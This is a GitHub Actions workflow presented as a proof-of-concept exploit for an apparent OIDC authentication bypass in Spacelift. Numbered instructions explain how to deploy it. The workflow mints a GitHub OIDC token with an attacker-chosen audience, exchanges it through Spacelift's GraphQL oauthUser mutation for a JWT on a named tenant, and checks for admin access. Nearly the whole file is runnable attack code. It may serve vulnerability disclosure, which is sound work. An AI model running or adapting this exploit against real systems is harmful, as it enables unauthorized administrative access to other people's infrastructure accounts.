# GitHub Actions Workflow to Exploit Spacelift OIDC Bypass
# 
# INSTRUCTIONS:
# 1. Create a new GitHub repository (can be public)
# 2. Create file: .github/workflows/spacelift-exploit.yml
# 3. Paste this content
# 4. Go to Actions tab and run the workflow
# 5. Check the output - if you get a JWT, the exploit works!

name: Spacelift OIDC Exploit PoC

on:
  workflow_dispatch:  # Manual trigger

permissions:
  id-token: write  # Required for OIDC token
  contents: read

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Get OIDC Token from GitHub
        id: get-token
        run: |
          echo "Getting OIDC token from GitHub..."
          
          # The audience must match the clientId we set in the API key
          AUDIENCE="https://github.com/attacker-org"
          
          # Get the OIDC token
          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUDIENCE}" | jq -r .value)
          
          echo "Got OIDC token (first 50 chars): ${OIDC_TOKEN:0:50}..."
          
          # Decode JWT header and payload (for debugging)
          echo "JWT Header:"
          echo $OIDC_TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq .
          echo "JWT Payload:"
          echo $OIDC_TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
          
          echo "oidc_token=$OIDC_TOKEN" >> $GITHUB_OUTPUT

      - name: Authenticate to Spacelift (THE EXPLOIT)
        env:
          OIDC_TOKEN: ${{ steps.get-token.outputs.oidc_token }}
        run: |
          echo "Attempting to authenticate to Spacelift..."
          
          # Target Spacelift account
          SPACELIFT_ENDPOINT="https://soufian3hm.app.spacelift.dev/graphql"
          
          # Exchange OIDC token for Spacelift JWT
          # This uses the oauthUser mutation
          RESPONSE=$(curl -s -X POST "$SPACELIFT_ENDPOINT" \
            -H "Content-Type: application/json" \
            -d '{
              "query": "mutation GetToken($token: String!) { oauthUser(token: $token) { jwt } }",
              "variables": {"token": "'"$OIDC_TOKEN"'"}
            }')
          
          echo "Spacelift Response:"
          echo "$RESPONSE" | jq .
          
          # Check if we got a JWT
          SPACELIFT_JWT=$(echo $RESPONSE | jq -r '.data.oauthUser.jwt // empty')
          
          if [ -n "$SPACELIFT_JWT" ]; then
            echo ""
            echo "ðŸš¨ðŸš¨ðŸš¨ EXPLOIT SUCCESSFUL! ðŸš¨ðŸš¨ðŸš¨"
            echo "Got Spacelift JWT token!"
            echo "This proves ANY GitHub Action can authenticate as ADMIN!"
            echo ""
            
            # Optional: Make an authenticated request
            echo "Testing authenticated access..."
            curl -s -X POST "$SPACELIFT_ENDPOINT" \
              -H "Content-Type: application/json" \
              -H "Authorization: Bearer $SPACELIFT_JWT" \
              -d '{"query": "{ viewer { id name admin } }"}' | jq .
          else
            echo "Authentication failed - check API key configuration"
            echo "Error: $(echo $RESPONSE | jq -r '.errors[0].message // empty')"
          fi
